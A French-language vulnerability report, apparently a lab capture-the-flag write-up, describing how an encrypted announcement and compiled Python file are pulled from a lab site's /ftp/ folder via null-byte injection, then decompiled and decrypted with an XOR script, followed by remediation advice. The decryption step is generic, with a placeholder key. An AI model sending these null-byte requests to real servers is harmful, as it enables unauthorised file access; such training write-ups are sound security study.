# Rapport de Vulnérabilité

## Vulnérabilité

| Champ                      | Détails                                                                 |
|----------------------------|-------------------------------------------------------------------------|
| **Type**                   | Exposition de code source compilé + Algorithme de chiffrement réversible |
| **Composant affecté**      | Endpoint FTP — `encrypt.pyc` + `announcement_encrypted.md`             |
| **Sévérité**               | 🟠 Élevée                                                               |

---

## Méthodologie

### Techniques utilisées
- Énumération de fichiers exposés
- Décompilation de bytecode Python (`.pyc`)
- Rétro-ingénierie de l'algorithme de chiffrement
- Déchiffrement du fichier `announcement_encrypted.md`

### Outils utilisés

| Outil              | Objectif                                          |
|--------------------|---------------------------------------------------|
| Navigateur         | Accès aux fichiers via null byte injection        |
| `uncompyle6` / `decompile3` | Décompilation du fichier `.pyc` en source Python lisible |
| Python             | Implémentation du déchiffrement inverse (decrypt) |

### Étapes

1. **Découverte des fichiers** — En naviguant sur `/ftp/`, on identifie deux fichiers suspects : `encrypt.pyc` (bytecode Python compilé) et `announcement_encrypted.md` (fichier chiffré).

2. **Accès via null byte** — Les deux fichiers sont récupérés via la technique de null byte injection :
   ```
   GET /ftp/encrypt.pyc%2500.md
   GET /ftp/announcement_encrypted.md%2500.md
   ```

3. **Décompilation du bytecode** — Le fichier `encrypt.pyc` est décompilé pour obtenir le code source Python original :
   ```bash
   uncompyle6 encrypt.pyc > encrypt.py
   ```

4. **Analyse de l'algorithme** — Le code décompilé révèle l'algorithme de chiffrement utilisé (XOR, Caesar, substitution...) ainsi que la clé ou le mécanisme de génération de clé.

5. **Implémentation du déchiffrement** — En inversant l'algorithme identifié, on déchiffre le contenu de `announcement_encrypted.md` pour obtenir le message en clair.

---

### Preuve de concept

**Récupération des fichiers :**
```
GET /ftp/encrypt.pyc%2500.md HTTP/2
GET /ftp/announcement_encrypted.md%2500.md HTTP/2
Host: ctf.juice.cyber.epitest.eu
```

**Décompilation :**
```bash
pip install uncompyle6
uncompyle6 encrypt.pyc > encrypt.py
cat encrypt.py
```

**Déchiffrement (inverse de l'algorithme identifié) :**
```python
def decrypt(ciphertext, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(ciphertext))

with open('announcement_encrypted.md', 'r') as f:
    encrypted = f.read()

print(decrypt(encrypted, 'the key'))
```

---

## Risques

### Impact

- **Exposition de l'algorithme de chiffrement** — le bytecode Python est facilement décompilable et révèle la logique interne de l'application
- **Déchiffrement de données confidentielles** — tout fichier chiffré avec cet algorithme peut être déchiffré
- **Exposition de clés hardcodées** — si la clé de chiffrement est présente dans le `.pyc`, elle est compromise
- **Fausse sécurité** — chiffrer des données avec un algorithme maison donne un sentiment de sécurité infondé

---

## Correction

### Correctifs

- Ne jamais stocker de fichiers `.pyc` ou de code source dans des répertoires accessibles publiquement
- Utiliser des algorithmes de chiffrement standard et éprouvés  au lieu d'implémentations maison
- Supprimer `encrypt.pyc` et `announcement_encrypted.md` du répertoire `/ftp/`

### Bonnes pratiques de sécurité recommandées

- Suivre les directives OWASP Top 10
- Ne jamais implémenter son propre algorithme de chiffrement — utiliser des bibliothèques cryptographiques standard (`cryptography`, `PyCryptodome`)
- Ajouter les fichiers `.pyc` au `.gitignore` et aux règles de déploiement pour éviter leur exposition accidentelle
- Auditer régulièrement les fichiers exposés dans les répertoires web publics